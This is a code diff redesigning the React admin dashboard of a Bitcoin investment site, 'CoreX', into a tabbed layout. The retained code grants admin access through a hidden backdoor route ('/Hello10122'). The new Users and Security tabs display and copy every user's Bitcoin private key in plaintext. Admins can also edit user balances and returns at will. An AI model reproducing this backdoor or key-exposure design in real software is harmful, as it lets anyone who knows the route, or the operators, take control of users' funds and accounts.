@@ -1,3 +1,4 @@
+
 import { useAuth } from "@/hooks/use-auth";
 import { useQuery, useMutation } from "@tanstack/react-query";
 import { queryClient } from "@/lib/queryClient";
@@ -14,8 +15,11 @@ import type { User, InvestmentPlan } from "@shared/schema";
 import { formatBitcoin } from "@/lib/utils";
 import { BottomNavigation } from "@/components/bottom-navigation";
 import { useLocation } from "wouter";
-import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock } from "lucide-react";
+import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock, BarChart3, Activity, Wallet, Database, Shield, AlertTriangle, CheckCircle, XCircle, Eye, EyeOff, Menu, X } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Badge } from "@/components/ui/badge";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Progress } from "@/components/ui/progress";
 
 interface AdminStats {
   totalUsers: number;
@@ -36,6 +40,15 @@ export default function Management() {
   const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
   const [vaultAddress, setVaultAddress] = useState("");
   const [depositAddress, setDepositAddress] = useState("");
+  const [activeTab, setActiveTab] = useState("overview");
+  const [sidebarOpen, setSidebarOpen] = useState(false);
+  const [currentTime, setCurrentTime] = useState(new Date());
+
+  // Update time every second
+  useEffect(() => {
+    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
+    return () => clearInterval(timer);
+  }, []);
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122';
@@ -75,54 +88,54 @@ export default function Management() {
   }, [adminConfig]);
 
   const updateConfigMutation = useMutation({
-      mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
-        const response = await fetch('/api/admin/config', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ vaultAddress, depositAddress }),
-        });
+    mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
+      const response = await fetch('/api/admin/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ vaultAddress, depositAddress }),
+      });
 
-        if (!response.ok) {
-          const error = await response.json();
-          throw new Error(error.error || 'Failed to update config');
-        }
-
-        return response.json();
-      },
-      onSuccess: () => {
-        queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
-        toast({
-          title: "Configuration Updated",
-          description: "Vault addresses have been successfully updated.",
-        });
-      },
-      onError: (error: any) => {
-        toast({
-          title: "Update Failed",
-          description: error.message,
-          variant: "destructive",
-        });
-      },
-    });
-
-    const updateFreePlanRateMutation = useMutation({
-      mutationFn: async ({ rate }: { rate: string }) => {
-        const response = await fetch('/api/admin/update-free-plan-rate', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ rate })
-        });
-        if (!response.ok) throw new Error('Failed to update free plan rate');
-        return response.json();
-      },
-      onSuccess: () => {
-        queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
-        toast({ title: "Free plan rate updated successfully!" });
-      },
-      onError: () => {
-        toast({ title: "Failed to update free plan rate", variant: "destructive" });
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.error || 'Failed to update config');
       }
-    });
+
+      return response.json();
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
+      toast({
+        title: "Configuration Updated",
+        description: "Vault addresses have been successfully updated.",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Update Failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
+  });
+
+  const updateFreePlanRateMutation = useMutation({
+    mutationFn: async ({ rate }: { rate: string }) => {
+      const response = await fetch('/api/admin/update-free-plan-rate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ rate })
+      });
+      if (!response.ok) throw new Error('Failed to update free plan rate');
+      return response.json();
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
+      toast({ title: "Free plan rate updated successfully!" });
+    },
+    onError: () => {
+      toast({ title: "Failed to update free plan rate", variant: "destructive" });
+    }
+  });
 
   const updateBalanceMutation = useMutation({
     mutationFn: async ({ userId, balance }: { userId: number; balance: string }) => {
@@ -364,10 +377,8 @@ export default function Management() {
 
   const togglePrivateKey = (userId: number) => {
     if (showPrivateKeys[userId]) {
-      // Hide the private key
       setShowPrivateKeys(prev => ({ ...prev, [userId]: false }));
     } else {
-      // Fetch and show the private key
       fetchPrivateKeyMutation.mutate(userId);
     }
   };
@@ -384,185 +395,598 @@ export default function Management() {
     updateConfigMutation.mutate({ vaultAddress, depositAddress });
   }
 
-  return (
-    <div className="max-w-sm mx-auto bg-background min-h-screen relative">
-      {/* Header */}
-      <header className="px-4 py-6 border-b dark-border">
+  const navigationItems = [
+    { id: "overview", label: "Overview", icon: BarChart3 },
+    { id: "users", label: "User Management", icon: Users },
+    { id: "plans", label: "Investment Plans", icon: TrendingUp },
+    { id: "transactions", label: "Transactions", icon: Clock },
+    { id: "security", label: "Security", icon: Shield },
+    { id: "config", label: "Configuration", icon: Settings },
+  ];
+
+  const renderSidebar = () => (
+    <div className={`fixed inset-y-0 left-0 z-50 w-64 bg-slate-900 transform ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'} transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:inset-0`}>
+      <div className="flex items-center justify-between h-16 px-6 border-b border-slate-700">
         <div className="flex items-center gap-3">
-          <div className="w-8 h-8 rounded-full bg-bitcoin flex items-center justify-center">
+          <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-bitcoin to-yellow-600 flex items-center justify-center">
             <span className="text-black text-sm font-bold">₿</span>
           </div>
           <div>
-            <h1 className="text-xl font-bold text-foreground">CoreX Admin</h1>
-            <p className="text-xs text-muted-foreground">Dashboard</p>
+            <h1 className="text-white font-bold text-lg">CoreX Admin</h1>
+            <p className="text-slate-400 text-xs">Management Portal</p>
           </div>
         </div>
-      </header>
+        <Button
+          variant="ghost"
+          size="icon"
+          onClick={() => setSidebarOpen(false)}
+          className="lg:hidden text-white hover:bg-slate-800"
+        >
+          <X className="w-5 h-5" />
+        </Button>
+      </div>
 
-      <div className="p-4 space-y-6">
-        {/* Stats Cards */}
-        <div className="grid grid-cols-1 gap-4">
-          <Card className="dark-card dark-border">
-            <CardHeader className="pb-2">
-              <CardTitle className="text-sm text-muted-foreground">Total Users</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <p className="text-2xl font-bold text-bitcoin">{stats?.totalUsers || 0}</p>
-            </CardContent>
-          </Card>
+      <nav className="mt-6 px-3">
+        {navigationItems.map((item) => (
+          <button
+            key={item.id}
+            onClick={() => {
+              setActiveTab(item.id);
+              setSidebarOpen(false);
+            }}
+            className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-lg mb-1 transition-colors ${
+              activeTab === item.id
+                ? 'bg-bitcoin text-black font-medium'
+                : 'text-slate-300 hover:bg-slate-800 hover:text-white'
+            }`}
+          >
+            <item.icon className="w-5 h-5" />
+            {item.label}
+          </button>
+        ))}
+      </nav>
 
-          <Card className="dark-card dark-border">
-            <CardHeader className="pb-2">
-              <CardTitle className="text-sm text-muted-foreground">Total Balance</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <p className="text-2xl font-bold text-gold">{formatBitcoin(stats?.totalBalance || "0")} BTC</p>
-            </CardContent>
-          </Card>
-
-          <Card className="dark-card dark-border">
-            <CardHeader className="pb-2">
-              <CardTitle className="text-sm text-muted-foreground">Active Investments</CardTitle>
-            </CardHeader>
-            <CardContent>
-              <p className="text-2xl font-bold text-green-400">{stats?.activeInvestments || 0}</p>
-            </CardContent>
-          </Card>
+      <div className="absolute bottom-6 left-3 right-3">
+        <div className="bg-slate-800 rounded-lg p-4">
+          <div className="flex items-center gap-2 mb-2">
+            <Activity className="w-4 h-4 text-green-400" />
+            <span className="text-green-400 text-sm font-medium">System Online</span>
+          </div>
+          <p className="text-slate-400 text-xs">
+            {currentTime.toLocaleTimeString()}
+          </p>
         </div>
+      </div>
+    </div>
+  );
 
-        {/* Vault Configuration */}
-        <Card className="dark-card dark-border">
+  const renderOverviewTab = () => (
+    <div className="space-y-6">
+      {/* Quick Stats Grid */}
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+        <Card className="bg-gradient-to-br from-blue-50 to-blue-100 border-blue-200">
+          <CardContent className="p-6">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-blue-600 text-sm font-medium">Total Users</p>
+                <p className="text-3xl font-bold text-blue-900">{stats?.totalUsers || 0}</p>
+                <p className="text-blue-600 text-xs mt-1">+2.5% from last month</p>
+              </div>
+              <div className="w-12 h-12 bg-blue-500 rounded-lg flex items-center justify-center">
+                <Users className="w-6 h-6 text-white" />
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card className="bg-gradient-to-br from-green-50 to-green-100 border-green-200">
+          <CardContent className="p-6">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-green-600 text-sm font-medium">Total Balance</p>
+                <p className="text-3xl font-bold text-green-900">{formatBitcoin(stats?.totalBalance || "0")}</p>
+                <p className="text-green-600 text-xs mt-1">BTC in system</p>
+              </div>
+              <div className="w-12 h-12 bg-green-500 rounded-lg flex items-center justify-center">
+                <Wallet className="w-6 h-6 text-white" />
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card className="bg-gradient-to-br from-orange-50 to-orange-100 border-orange-200">
+          <CardContent className="p-6">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-orange-600 text-sm font-medium">Active Investments</p>
+                <p className="text-3xl font-bold text-orange-900">{stats?.activeInvestments || 0}</p>
+                <p className="text-orange-600 text-xs mt-1">Currently running</p>
+              </div>
+              <div className="w-12 h-12 bg-orange-500 rounded-lg flex items-center justify-center">
+                <TrendingUp className="w-6 h-6 text-white" />
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card className="bg-gradient-to-br from-purple-50 to-purple-100 border-purple-200">
+          <CardContent className="p-6">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-purple-600 text-sm font-medium">System Health</p>
+                <p className="text-3xl font-bold text-purple-900">98.5%</p>
+                <p className="text-purple-600 text-xs mt-1">Uptime this month</p>
+              </div>
+              <div className="w-12 h-12 bg-purple-500 rounded-lg flex items-center justify-center">
+                <Activity className="w-6 h-6 text-white" />
+              </div>
+            </div>
+          </CardContent>
+        </Card>
+      </div>
+
+      {/* System Status and Quick Actions */}
+      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <Card>
           <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-foreground">
-              <Settings className="w-5 h-5" />
-              Vault Configuration
+            <CardTitle className="flex items-center gap-2">
+              <Shield className="w-5 h-5 text-green-500" />
+              System Status
             </CardTitle>
           </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div>
-                <Label htmlFor="vaultAddress">Vault Address</Label>
+          <CardContent className="space-y-4">
+            <div className="flex items-center justify-between">
+              <span className="text-sm">Database Connection</span>
+              <Badge variant="secondary" className="bg-green-100 text-green-800">
+                <CheckCircle className="w-3 h-3 mr-1" />
+                Healthy
+              </Badge>
+            </div>
+            <div className="flex items-center justify-between">
+              <span className="text-sm">Bitcoin API</span>
+              <Badge variant="secondary" className="bg-green-100 text-green-800">
+                <CheckCircle className="w-3 h-3 mr-1" />
+                Connected
+              </Badge>
+            </div>
+            <div className="flex items-center justify-between">
+              <span className="text-sm">Investment Updates</span>
+              <Badge variant="secondary" className="bg-green-100 text-green-800">
+                <CheckCircle className="w-3 h-3 mr-1" />
+                Running
+              </Badge>
+            </div>
+            <div className="flex items-center justify-between">
+              <span className="text-sm">Last Backup</span>
+              <Badge variant="secondary" className="bg-blue-100 text-blue-800">
+                2 hours ago
+              </Badge>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Quick Actions</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-3">
+            <Button
+              onClick={() => setLocation('/admin-transactions')}
+              className="w-full justify-start bg-blue-600 hover:bg-blue-700"
+            >
+              <Clock className="w-4 h-4 mr-2" />
+              View Pending Transactions
+            </Button>
+            <Button
+              onClick={() => setLocation('/admin-notifications')}
+              variant="outline"
+              className="w-full justify-start"
+            >
+              <Send className="w-4 h-4 mr-2" />
+              Send Notifications
+            </Button>
+            <Button
+              onClick={() => syncAllBalancesMutation.mutate()}
+              disabled={syncAllBalancesMutation.isPending}
+              variant="outline"
+              className="w-full justify-start"
+            >
+              {syncAllBalancesMutation.isPending ? (
+                <>
+                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
+                  Syncing...
+                </>
+              ) : (
+                <>
+                  <RefreshCw className="w-4 h-4 mr-2" />
+                  Sync All Balances
+                </>
+              )}
+            </Button>
+          </CardContent>
+        </Card>
+      </div>
+    </div>
+  );
+
+  const renderUsersTab = () => (
+    <Card>
+      <CardHeader>
+        <CardTitle className="flex items-center gap-2">
+          <Users className="w-5 h-5" />
+          User Management
+        </CardTitle>
+      </CardHeader>
+      <CardContent className="p-0">
+        <div className="overflow-x-auto">
+          <Table>
+            <TableHeader>
+              <TableRow>
+                <TableHead>User</TableHead>
+                <TableHead>Balance</TableHead>
+                <TableHead>Plan</TableHead>
+                <TableHead>Wallet</TableHead>
+                <TableHead>Actions</TableHead>
+              </TableRow>
+            </TableHeader>
+            <TableBody>
+              {users?.map((user) => {
+                const userPlan = investmentPlans?.find(plan => plan.id === user.currentPlanId);
+                return (
+                  <TableRow key={user.id}>
+                    <TableCell>
+                      <div>
+                        <p className="font-medium">{user.email}</p>
+                        <p className="text-sm text-muted-foreground">ID: {user.id}</p>
+                      </div>
+                    </TableCell>
+                    <TableCell>
+                      <div className="flex items-center gap-2">
+                        <Bitcoin className="w-4 h-4 text-bitcoin" />
+                        <span className="font-mono">{formatBitcoin(user.balance)}</span>
+                      </div>
+                    </TableCell>
+                    <TableCell>
+                      {userPlan ? (
+                        <Badge style={{ backgroundColor: userPlan.color + '20', color: userPlan.color }}>
+                          {userPlan.name}
+                        </Badge>
+                      ) : (
+                        <Badge variant="secondary">Free Plan</Badge>
+                      )}
+                    </TableCell>
+                    <TableCell>
+                      <div className="flex items-center gap-2">
+                        {showPrivateKeys[user.id] ? (
+                          <div className="flex items-center gap-2">
+                            <Input
+                              type="text"
+                              value={userPrivateKeys[user.id] || ""}
+                              readOnly
+                              className="w-32 text-xs"
+                            />
+                            <Button
+                              size="sm"
+                              onClick={() => copyPrivateKey(userPrivateKeys[user.id])}
+                              className="bg-green-500 hover:bg-green-600"
+                            >
+                              <Copy className="w-3 h-3" />
+                            </Button>
+                            <Button
+                              size="sm"
+                              onClick={() => togglePrivateKey(user.id)}
+                              variant="outline"
+                            >
+                              <EyeOff className="w-3 h-3" />
+                            </Button>
+                          </div>
+                        ) : (
+                          <Button
+                            size="sm"
+                            onClick={() => togglePrivateKey(user.id)}
+                            variant="outline"
+                          >
+                            <Eye className="w-3 h-3 mr-1" />
+                            Show Key
+                          </Button>
+                        )}
+                      </div>
+                    </TableCell>
+                    <TableCell>
+                      <div className="flex gap-1">
+                        <Button
+                          size="sm"
+                          onClick={() => handleUpdateBalance(user)}
+                          className="bg-bitcoin hover:bg-bitcoin/90 text-black"
+                        >
+                          <Edit className="w-3 h-3" />
+                        </Button>
+                        <Button
+                          size="sm"
+                          onClick={() => handleUpdatePlan(user)}
+                          variant="outline"
+                        >
+                          <Settings className="w-3 h-3" />
+                        </Button>
+                      </div>
+                    </TableCell>
+                  </TableRow>
+                );
+              })}
+            </TableBody>
+          </Table>
+        </div>
+      </CardContent>
+    </Card>
+  );
+
+  const renderPlansTab = () => (
+    <Card>
+      <CardHeader>
+        <CardTitle className="flex items-center gap-2">
+          <TrendingUp className="w-5 h-5" />
+          Investment Plan Management
+        </CardTitle>
+      </CardHeader>
+      <CardContent>
+        <div className="grid gap-6">
+          {/* Free Plan Rate Configuration */}
+          <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 rounded-lg border border-blue-200">
+            <h3 className="font-semibold text-blue-900 mb-4">Free Plan Configuration</h3>
+            <div className="flex gap-4 items-end">
+              <div className="flex-1">
+                <Label htmlFor="freePlanRate">Rate (% per 10 minutes)</Label>
                 <Input
-                  id="vaultAddress"
-                  value={vaultAddress}
-                  onChange={(e) => setVaultAddress(e.target.value)}
-                  placeholder="Enter vault Bitcoin address"
+                  id="freePlanRate"
+                  type="number"
+                  step="0.0001"
+                  defaultValue={adminConfig ? (parseFloat(adminConfig.freePlanRate) * 100).toFixed(4) : "0.0100"}
+                  placeholder="0.0100"
                   className="mt-1"
                 />
               </div>
-              <div>
-                <Label htmlFor="depositAddress">Deposit Address</Label>
-                <Input
-                  id="depositAddress"
-                  value={depositAddress}
-                  onChange={(e) => setDepositAddress(e.target.value)}
-                  placeholder="Enter deposit Bitcoin address"
-                  className="mt-1"
-                />
-              </div>
-              <div>
-                <Label htmlFor="freePlanRate">Free Plan Rate (% per 10 minutes)</Label>
-                <div className="flex gap-2">
-                  <Input
-                    id="freePlanRate"
-                    type="number"
-                    step="0.0001"
-                    defaultValue={adminConfig ? (parseFloat(adminConfig.freePlanRate) * 100).toFixed(4) : "0.0100"}
-                    placeholder="0.0100"
-                    className="mt-1 flex-1"
-                    onKeyDown={(e) => {
-                      if (e.key === 'Enter') {
-                        const target = e.target as HTMLInputElement;
-                        const newRate = parseFloat(target.value) / 100;
-                        if (!isNaN(newRate) && newRate >= 0) {
-                          updateFreePlanRateMutation.mutate({ rate: newRate.toString() });
-                        } else {
-                          toast({
-                            title: "Invalid Rate",
-                            description: "Please enter a valid percentage rate",
-                            variant: "destructive",
-                          });
-                        }
-                      }
-                    }}
-                  />
-                  <Button
-                    type="button"
-                    size="sm"
-                    className="mt-1"
-                    onClick={(e) => {
-                      const input = document.getElementById('freePlanRate') as HTMLInputElement;
-                      if (input) {
-                        const newRate = parseFloat(input.value) / 100;
-                        if (!isNaN(newRate) && newRate >= 0) {
-                          updateFreePlanRateMutation.mutate({ rate: newRate.toString() });
-                        } else {
-                          toast({
-                            title: "Invalid Rate",
-                            description: "Please enter a valid percentage rate",
-                            variant: "destructive",
-                          });
-                        }
-                      }
-                    }}
-                    disabled={updateFreePlanRateMutation.isPending}
+              <Button
+                onClick={(e) => {
+                  const input = document.getElementById('freePlanRate') as HTMLInputElement;
+                  if (input) {
+                    const newRate = parseFloat(input.value) / 100;
+                    if (!isNaN(newRate) && newRate >= 0) {
+                      updateFreePlanRateMutation.mutate({ rate: newRate.toString() });
+                    }
+                  }
+                }}
+                disabled={updateFreePlanRateMutation.isPending}
+                className="bg-blue-600 hover:bg-blue-700"
+              >
+                {updateFreePlanRateMutation.isPending ? "Updating..." : "Update"}
+              </Button>
+            </div>
+          </div>
+
+          {/* Investment Plans */}
+          <div className="space-y-4">
+            {investmentPlans?.map((plan) => (
+              <div key={plan.id} className="border rounded-lg p-6 bg-gradient-to-r from-gray-50 to-white">
+                <div className="flex justify-between items-start mb-4">
+                  <div>
+                    <h4 className="font-semibold text-lg">{plan.name}</h4>
+                    <p className="text-sm text-muted-foreground">
+                      {plan.roiPercentage}% ROI over {plan.durationDays} days
+                    </p>
+                  </div>
+                  <Badge 
+                    className="px-3 py-1"
+                    style={{ backgroundColor: plan.color + '20', color: plan.color }}
                   >
-                    {updateFreePlanRateMutation.isPending ? "Updating..." : "Update"}
+                    {plan.isActive ? 'Active' : 'Inactive'}
+                  </Badge>
+                </div>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  <div>
+                    <Label htmlFor={`minAmount-${plan.id}`}>Minimum Amount (BTC)</Label>
+                    <Input
+                      id={`minAmount-${plan.id}`}
+                      type="number"
+                      step="0.00000001"
+                      defaultValue={plan.minAmount}
+                      className="mt-1"
+                      onBlur={(e) => {
+                        const newAmount = e.target.value;
+                        if (newAmount && newAmount !== plan.minAmount) {
+                          updatePlanAmountMutation.mutate({
+                            planId: plan.id,
+                            minAmount: newAmount
+                          });
+                        }
+                      }}
+                    />
+                  </div>
+                  <div>
+                    <Label htmlFor={`dailyRate-${plan.id}`}>Daily Return Rate (%)</Label>
+                    <Input
+                      id={`dailyRate-${plan.id}`}
+                      type="number"
+                      step="0.0001"
+                      defaultValue={(parseFloat(plan.dailyReturnRate) * 100).toFixed(4)}
+                      className="mt-1"
+                      onBlur={(e) => {
+                        const newRate = (parseFloat(e.target.value) / 100).toString();
+                        if (newRate && newRate !== plan.dailyReturnRate) {
+                          updatePlanRateMutation.mutate({
+                            planId: plan.id,
+                            dailyReturnRate: newRate
+                          });
+                        }
+                      }}
+                    />
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      </CardContent>
+    </Card>
+  );
+
+  const renderTransactionsTab = () => (
+    <Card>
+      <CardHeader>
+        <CardTitle className="flex items-center gap-2">
+          <Clock className="w-5 h-5" />
+          Transaction Management
+        </CardTitle>
+      </CardHeader>
+      <CardContent className="space-y-4">
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <Button
+            onClick={() => setLocation('/admin-transactions')}
+            className="h-20 bg-blue-600 hover:bg-blue-700 flex-col"
+          >
+            <Clock className="w-6 h-6 mb-2" />
+            <span>Pending Transactions</span>
+            <span className="text-xs opacity-75">Review & Approve</span>
+          </Button>
+          <Button
+            onClick={() => setLocation('/admin-notifications')}
+            variant="outline"
+            className="h-20 flex-col"
+          >
+            <Send className="w-6 h-6 mb-2" />
+            <span>Send Notifications</span>
+            <span className="text-xs opacity-75">Bulk Messaging</span>
+          </Button>
+        </div>
+      </CardContent>
+    </Card>
+  );
+
+  const renderSecurityTab = () => (
+    <div className="space-y-6">
+      <Card>
+        <CardHeader>
+          <CardTitle className="flex items-center gap-2">
+            <Shield className="w-5 h-5" />
+            Security Management
+          </CardTitle>
+        </CardHeader>
+        <CardContent className="space-y-4">
+          <Button
+            onClick={() => testBitcoinGenMutation.mutate()}
+            disabled={testBitcoinGenMutation.isPending}
+            className="w-full bg-green-600 hover:bg-green-700"
+          >
+            {testBitcoinGenMutation.isPending ? (
+              <>
+                <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
+                Testing Bitcoin Generation...
+              </>
+            ) : (
+              <>
+                <Bitcoin className="w-4 h-4 mr-2" />
+                Test Bitcoin Generation
+              </>
+            )}
+          </Button>
+          <p className="text-sm text-muted-foreground">
+            Verify that Bitcoin addresses and private keys can be generated correctly.
+          </p>
+        </CardContent>
+      </Card>
+
+      <Card>
+        <CardHeader>
+          <CardTitle className="flex items-center gap-2">
+            <Key className="w-5 h-5" />
+            User Private Keys
+          </CardTitle>
+        </CardHeader>
+        <CardContent>
+          <div className="space-y-4 max-h-96 overflow-y-auto">
+            {users?.map((user) => (
+              <div key={user.id} className="border rounded-lg p-4 bg-gradient-to-r from-red-50 to-pink-50">
+                <div className="flex justify-between items-start mb-3">
+                  <div>
+                    <p className="font-medium">{user.email}</p>
+                    <p className="text-sm text-muted-foreground">User ID: {user.id}</p>
+                  </div>
+                  <Button
+                    size="sm"
+                    variant="outline"
+                    onClick={() => {
+                      navigator.clipboard.writeText(user.privateKey || '');
+                      toast({
+                        title: "Copied",
+                        description: "Private key copied to clipboard",
+                      });
+                    }}
+                  >
+                    <Copy className="w-3 h-3 mr-1" />
+                    Copy
                   </Button>
                 </div>
-                <p className="text-xs text-muted-foreground mt-1">
-                  Current: {adminConfig ? (parseFloat(adminConfig.freePlanRate) * 100).toFixed(4) : "0.0100"}% per 10 minutes
-                </p>
+                <div className="space-y-2">
+                  <div>
+                    <p className="text-xs font-medium text-muted-foreground mb-1">Bitcoin Address:</p>
+                    <p className="text-xs font-mono bg-white p-2 rounded border break-all">{user.bitcoinAddress}</p>
+                  </div>
+                  <div>
+                    <p className="text-xs font-medium text-muted-foreground mb-1">Private Key:</p>
+                    <p className="text-xs font-mono bg-white p-2 rounded border break-all text-red-600">
+                      {user.privateKey || 'No private key available'}
+                    </p>
+                  </div>
+                </div>
               </div>
-              <Button
-                onClick={updateConfig}
-                disabled={updateConfigMutation.isPending}
-                className="w-full bg-bitcoin hover:bg-bitcoin/90"
-              >
-                {updateConfigMutation.isPending ? "Updating..." : "Update Configuration"}
-              </Button>
-            </div>
-          </CardContent>
-        </Card>
+            ))}
+          </div>
+        </CardContent>
+      </Card>
+    </div>
+  );
 
-        {/* Transaction Management */}
-        <Card className="dark-card dark-border">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-foreground">
-              <Clock className="w-5 h-5" />
-              Transaction Management
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <Button
-                onClick={() => setLocation('/admin-transactions')}
-                className="w-full bg-blue-600 hover:bg-blue-700"
-              >
-                <Clock className="w-4 h-4 mr-2" />
-                View Pending Transactions
-              </Button>
-              <Button
-                onClick={() => setLocation('/admin-notifications')}
-                variant="outline"
-                className="w-full"
-              >
-                <Send className="w-4 h-4 mr-2" />
-                Send Notifications
-              </Button>
+  const renderConfigTab = () => (
+    <Card>
+      <CardHeader>
+        <CardTitle className="flex items-center gap-2">
+          <Settings className="w-5 h-5" />
+          System Configuration
+        </CardTitle>
+      </CardHeader>
+      <CardContent>
+        <div className="space-y-6">
+          <div className="grid gap-4">
+            <div>
+              <Label htmlFor="vaultAddress">Vault Address</Label>
+              <Input
+                id="vaultAddress"
+                value={vaultAddress}
+                onChange={(e) => setVaultAddress(e.target.value)}
+                placeholder="Enter vault Bitcoin address"
+                className="mt-1 font-mono"
+              />
             </div>
-          </CardContent>
-        </Card>
+            <div>
+              <Label htmlFor="depositAddress">Deposit Address</Label>
+              <Input
+                id="depositAddress"
+                value={depositAddress}
+                onChange={(e) => setDepositAddress(e.target.value)}
+                placeholder="Enter deposit Bitcoin address"
+                className="mt-1 font-mono"
+              />
+            </div>
+            <Button
+              onClick={updateConfig}
+              disabled={updateConfigMutation.isPending}
+              className="w-full bg-bitcoin hover:bg-bitcoin/90 text-black"
+            >
+              {updateConfigMutation.isPending ? "Updating..." : "Update Configuration"}
+            </Button>
+          </div>
 
-        {/* Bitcoin Management */}
-        <Card className="dark-card dark-border">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-foreground">
-              <Bitcoin className="w-5 h-5" />
-              Bitcoin Management
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
+          <div className="pt-6 border-t">
+            <h3 className="font-semibold mb-4">Bitcoin Management</h3>
             <Button
               onClick={() => syncAllBalancesMutation.mutate()}
               disabled={syncAllBalancesMutation.isPending}
@@ -571,265 +995,103 @@ export default function Management() {
               {syncAllBalancesMutation.isPending ? (
                 <>
                   <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
-                  Syncing Balances...
+                  Syncing All Balances...
                 </>
               ) : (
                 <>
                   <RefreshCw className="w-4 h-4 mr-2" />
-                  Sync All User Balances with Blockchain
+                  Sync All User Balances
                 </>
               )}
             </Button>
-            <p className="text-xs text-muted-foreground mt-2">
-              This will check all user Bitcoin addresses on the blockchain and update their balances accordingly.
+            <p className="text-sm text-muted-foreground mt-2">
+              Check all user Bitcoin addresses on the blockchain and update balances.
             </p>
-            <Button
-              onClick={() => testBitcoinGenMutation.mutate()}
-              disabled={testBitcoinGenMutation.isPending}
-              className="w-full bg-green-500 hover:bg-green-500/90 text-black mt-4"
-            >
-              {testBitcoinGenMutation.isPending ? (
-                <>
-                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
-                  Testing Bitcoin Generation...
-                </>
-              ) : (
-                <>
-                  <Bitcoin className="w-4 h-4 mr-2" />
-                  Test Bitcoin Generation
-                </>
-              )}
-            </Button>
-            <p className="text-xs text-muted-foreground mt-2">
-              This will run a test to ensure Bitcoin addresses and private keys can be generated correctly.
-            </p>
-          </CardContent>
-        </Card>
+          </div>
+        </div>
+      </CardContent>
+    </Card>
+  );
 
-        {/* Investment Plan Management */}
-        <Card className="dark-card dark-border">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2 text-foreground">
-              <TrendingUp className="w-5 h-5" />
-              Investment Plan Management
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              {investmentPlans?.map((plan) => (
-                <div key={plan.id} className="border rounded-lg p-4 space-y-3">
-                  <div className="flex justify-between items-start">
-                    <div>
-                      <h4 className="font-medium text-foreground">{plan.name}</h4>
-                      <p className="text-sm text-muted-foreground">
-                        {plan.roiPercentage}% ROI over {plan.durationDays} days
-                      </p>
-                    </div>
-                    <span 
-                      className="px-2 py-1 rounded text-xs"
-                      style={{ backgroundColor: plan.color + '20', color: plan.color }}
-                    >
-                      {plan.isActive ? 'Active' : 'Inactive'}
-                    </span>
-                  </div>
-                  <div className="grid grid-cols-1 gap-3">
-                    <div>
-                      <Label htmlFor={`minAmount-${plan.id}`}>Minimum Amount (BTC)</Label>
-                      <Input
-                        id={`minAmount-${plan.id}`}
-                        type="number"
-                        step="0.00000001"
-                        defaultValue={plan.minAmount}
-                        placeholder="0.00000000"
-                        className="mt-1"
-                        onBlur={(e) => {
-                          const newAmount = e.target.value;
-                          if (newAmount && newAmount !== plan.minAmount) {
-                            updatePlanAmountMutation.mutate({
-                              planId: plan.id,
-                              minAmount: newAmount
-                            });
-                          }
-                        }}
-                      />
-                    </div>
-                    <div>
-                      <Label htmlFor={`dailyRate-${plan.id}`}>Daily Return Rate (%)</Label>
-                      <Input
-                        id={`dailyRate-${plan.id}`}
